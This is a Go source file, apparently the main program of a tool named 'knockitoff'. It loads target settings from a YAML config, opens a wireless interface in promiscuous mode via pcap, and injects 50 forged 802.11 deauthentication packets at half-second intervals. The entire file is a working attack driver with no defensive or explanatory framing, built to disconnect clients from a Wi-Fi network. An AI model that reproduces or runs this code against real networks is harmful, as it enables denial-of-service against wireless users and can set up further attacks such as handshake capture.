package main

import (
	"fmt"
	"log"
	"os"
	"time"

	_ "github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/teohrt/knockitoff/config"
	"github.com/teohrt/knockitoff/packets"
	"gopkg.in/yaml.v2"
)

var (
	device      = "en0"
	snaplen     = int32(1024)
	promiscuous = true
	timeout     = 30 * time.Second
)

func main() {
	f, err := os.Open("config.yml")
	if err != nil {
		fmt.Println("Error reading config")
		log.Fatal(err)
	}
	defer f.Close()

	var cfg config.Config
	decoder := yaml.NewDecoder(f)
	err = decoder.Decode(&cfg)
	if err != nil {
		fmt.Println("Error decoding config")
		log.Fatal(err)
	}

	handle, err := pcap.OpenLive(device, snaplen, promiscuous, timeout)
	if err != nil {
		fmt.Println("Error creating handler")
		log.Fatal(err)
	}
	defer handle.Close()

	packetBase, err := config.ConvertToPacketBase(&cfg)
	if err != nil {
		fmt.Println("Error converting cfg to PacketBase")
		log.Fatal(err)
	}

	for i := uint16(0); i < 50; i++ {
		packet, err := packets.NewDeauthPacket(packetBase, i)
		if err != nil {
			fmt.Println("Error creating packet")
			log.Fatal(err)
		}
		err = handle.WritePacketData(packet)
		if err != nil {
			fmt.Println("Error writing writing packet data")
			log.Fatal(err)
		}
		fmt.Printf("Packet #%d sent\n", i+1)
		time.Sleep(500 * time.Millisecond)
	}
}
